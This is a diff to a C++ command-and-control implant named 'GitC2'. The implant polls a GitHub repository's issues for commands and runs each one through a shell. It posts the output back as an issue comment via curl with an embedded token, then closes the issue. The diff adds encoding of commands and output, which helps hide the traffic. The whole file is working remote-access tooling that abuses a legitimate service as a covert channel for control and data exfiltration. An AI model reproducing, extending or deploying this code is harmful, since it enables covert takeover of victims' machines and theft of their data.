@@ -6,6 +6,7 @@
 #include <chrono>
 #include <regex>
 #include "settings.h"
+#include "crypto.h"
 
 using namespace std;
 
@@ -23,8 +24,9 @@ string exec(const string& cmd) {
 int main() {
     string base_url = "https://api.github.com/repos/" + REPO_OWNER + "/" + REPO_NAME + "/issues";
 
-    cout << "[!] GitC2: github.com/N3agu/GitC2\n";
-    cout << "[*] URL: " << base_url << "\n\n";
+    cout << "[!] GitC2: github.com/" << REPO_OWNER << "/" << REPO_NAME << "\n";
+    cout << "[*] Target URL: " << base_url << "\n";
+    cout << "[*] Encrypted Communication: " << (ENCRYPT_COMMUNICATION ? "ENABLED" : "DISABLED") << "\n\n";
 
     while (true) {
         cout << "[*] Polling for open issues...\n";
@@ -44,6 +46,11 @@ int main() {
 
                 if (regex_search(response, match, body_regex)) {
                     string task_cmd = match[1].str();
+
+                    if (ENCRYPT_COMMUNICATION) {
+                        task_cmd = decode_payload(task_cmd, GITHUB_TOKEN);
+                    }
+
                     cout << "[+] Extracted Command: [" << task_cmd << "]\n";
 
                     if (task_cmd == "exit" || task_cmd == "quit") {
@@ -53,7 +60,10 @@ int main() {
 
                     cout << "[*] Executing command...\n";
                     string output = exec(task_cmd);
-                    cout << "[+] Raw Output Length: " << output.length() << " characters\n";
+
+                    if (ENCRYPT_COMMUNICATION) {
+                        output = encode_payload(output, GITHUB_TOKEN);
+                    }
 
                     string clean_output = regex_replace(output, regex("\\\\"), "\\\\\\\\");
                     clean_output = regex_replace(clean_output, regex("\""), "\\\"");
@@ -62,11 +72,11 @@ int main() {
 
                     string post_cmd = "curl -s -X POST -H \"Accept: application/vnd.github.v3+json\" -H \"Authorization: token " + GITHUB_TOKEN + "\" -d \"{\\\"body\\\":\\\"" + clean_output + "\\\"}\" \"" + base_url + "/" + issue_num + "/comments\"";
                     cout << "[*] Sending POST request to append comment...\n";
-                    string post_res = exec(post_cmd);
+                    exec(post_cmd);
 
                     string close_cmd = "curl -s -X PATCH -H \"Accept: application/vnd.github.v3+json\" -H \"Authorization: token " + GITHUB_TOKEN + "\" -d \"{\\\"state\\\":\\\"closed\\\"}\" \"" + base_url + "/" + issue_num + "\"";
-                    cout << "[*] Sending PATCH request to close issue #" << issue_num << "...\n";
-                    string close_res = exec(close_cmd);
+                    cout << "[*] Sending PATCH request to close issue #" << issue_num << "...\n\n";
+                    exec(close_cmd);
                 }
                 else {
                     cout << "[-] Failed to extract command body. The regex might have missed it.\n";
